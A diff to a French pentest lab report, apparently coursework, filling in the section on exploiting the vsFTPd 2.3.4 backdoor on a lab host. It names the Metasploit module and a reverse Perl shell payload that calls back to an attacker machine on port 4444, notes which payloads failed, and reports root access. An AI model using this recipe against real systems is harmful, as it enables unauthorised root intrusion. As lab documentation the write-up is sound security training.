@@ -88,9 +88,27 @@ dont **6 critiques** et plusieurs hautes. Liste triée par sévérité :
 
 ## Job 05 — Exploitation d'une vulnérabilité
 
-*À compléter : vulnérabilité choisie, module Metasploit, payload utilisée et ce
-qu'elle fait, accès obtenu.*
-Captures : `captures/job05-exploit/`
+**Vulnérabilité choisie :** le serveur FTP **vsFTPd 2.3.4**, repéré par Nessus (plugin
+*vsftpd Detection*, port 21/tcp). Cette version contient une **porte dérobée** : un login FTP
+dont le nom finit par `:)` déclenche l'ouverture d'un shell **root** sur le port 6200.
+
+![Nessus détecte vsFTPd 2.3.4](captures/job05-exploit/01-nessus-vsftpd-detecte.png)
+
+**Exploitation (Metasploit) :**
+- Module : `exploit/unix/ftp/vsftpd_234_backdoor` — `RHOSTS 192.168.100.10`
+- Payload : `cmd/unix/reverse_perl` — `LHOST 192.168.100.11`
+
+**Ce que fait la payload :** une fois le backdoor déclenché, le shell ouvert sur la cible
+exécute un petit script **Perl** qui ouvre une connexion retour vers la machine attaquante
+(`192.168.100.11:4444`). Metasploit récupère cette connexion sous forme de **session shell**.
+
+> Remarques (ce qui n'a pas marché) : sur cette version récente du module, la payload
+> historique `cmd/unix/interact` n'est plus compatible, et `cmd/unix/reverse_bash` n'a pas
+> renvoyé la connexion. C'est `cmd/unix/reverse_perl` qui a fonctionné.
+
+**Résultat :** session ouverte, `uid=0(root)` → contrôle total de la machine.
+
+![Shell root obtenu via Metasploit](captures/job05-exploit/02-metasploit-root.png)
 
 ## Job 06 — Accès non autorisé + post-exploitation
 
